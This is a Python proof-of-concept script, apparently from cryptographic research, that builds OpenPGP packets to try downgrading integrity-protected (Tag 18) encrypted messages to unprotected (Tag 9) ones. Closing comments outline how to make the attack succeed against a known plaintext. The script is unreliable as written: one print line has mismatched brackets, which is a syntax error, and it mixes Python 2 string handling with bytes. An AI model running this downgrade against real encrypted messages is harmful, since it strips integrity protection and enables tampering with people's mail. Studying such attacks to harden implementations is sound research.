#!/usr/bin/env python
"""Downgrade Tag 18 to Tag 9 packets.

This shouldn't work on any OpenPGP implementation.
It might on some.
"""
"""pylint option no-invalid-name"""
from __future__ import division, print_function

# from binascii import hexlify
from hashlib import sha1, sha256
from Crypto.Cipher import AES


def xor(it1, it2):
  """Xor together two strings."""
  return bytes(bytearray([x1 ^ x2 for x1, x2
                          in zip(bytearray(it1), bytearray(it2))]))


LITERAL = bytearray([
    0x80 | (11 << 2) | 3,  # 1B: old-style | literal | indeterminate
    'u',                   # 1B: UTF-8
    0,                     # 1B: zero-length filename
    0, 0, 0, 0,            # 4B: no timestamp
    'm', 'd', 'c', '?'     # 4B: "mdc?"
    ])

# This is the worst-case scenario (in general any IV
# with all bytes the same is bad);
IV = '\x00' * 16

prefix = IV + IV[14:16]
payload = bytes(prefix + LITERAL + '\xd3\x14')
mdc = sha1(payload).digest()
payload += mdc

# This key might be more interesting:
# '\x00\x00\x00\x00\x00\x00\x00\x00$I\x00\x00\x00\x00\x00\x00'
# Or this one: 10740526
#
KEY = sha256('test').digest()[:32]
padlen = 16 - (len(payload) % 16)
padded_payload = payload + '\x00'*padlen
SEIPD_PAYLOAD = (AES.new(KEY, mode=AES.MODE_CFB,
                         IV='\x00'*16, segment_size=128)
                 .encrypt(padded_payload)[:len(payload)])

SEIPD = bytearray([
    0xc0 | 18,  # new | SEIPD
    len(SEIPD_PAYLOAD) + 1, 1]) + SEIPD_PAYLOAD


SKESK = bytearray([
    0xc0 | 3, # new | SKESK
    4,        # one-octet length
    0x04,     # v4
    0x09,     # AES-256
    0x00,     # S2K simple
    0x08      # SHA256
    ])

open('seipd.test', 'wb').write(SKESK + SEIPD)

#twobytes = '\x00\x00'
twobytes = '\xf6\xe3' # magic happens, or just try 2^16 times

# Like a reflux oven for crossgrade attacks. Yeah. That's where
# the cool name comes from.
recrux = bytes('\x00\x00' + SEIPD_PAYLOAD[0:16]
               + twobytes + SEIPD_PAYLOAD[18:18+len(LITERAL)])
recruxpad = recrux + '\x00' * 32

# The straightforward way of implementing OpenPGP-R decryption.
derecrux = (AES.new(KEY, mode=AES.MODE_CFB, IV=recrux[2:18],
                    segment_size=128)
            .decrypt(recruxpad[18:34])[:len(LITERAL)+2])

recrux_packet = SKESK + '\xa7' + recrux
open('recrux.test', 'wb').write(recrux_packet)

print(repr([x for x in bytearray(recrux_packet)))

# For convenience, an ASCII-armored version of the recrux.
ASCII_ARMORED = """-----BEGIN PGP MESSAGE-----
Charset: UTF-8

wwQECQAIpwAAawLiQYeMw7vdoPcZz3UU7Pbj/iDZslxABeTlSnc=
=/r2A
-----END PGP MESSAGE-----"""

# Suppose that the target doesn't like uncompressed compressed
# packets.
#
# Assume, as is standard, that the target plaintext is known (since
# otherwise you can't usefully modify it).
#
# Here's how to make the attack work: Aim for an old-style literal
# packet with indeterminate length, followed by 'u' or 't'. Now,
# (using the known plaintext) write out a literal packet with a
# *filename length* sufficient to hide two bad blocks. Resync to
# the prefix, and then go on from there. p=2^-15!

# The legitimate Tag 9 payload corresponding to the same message.
SE_PAYLOAD = (AES.new(KEY, mode=AES.MODE_OPENPGP, iv=IV)
              .encrypt(bytes(LITERAL)))

SE = bytearray([0xc0 | 9,        # new | literal
                len(SE_PAYLOAD)  # one-octet length
                ]) + SE_PAYLOAD
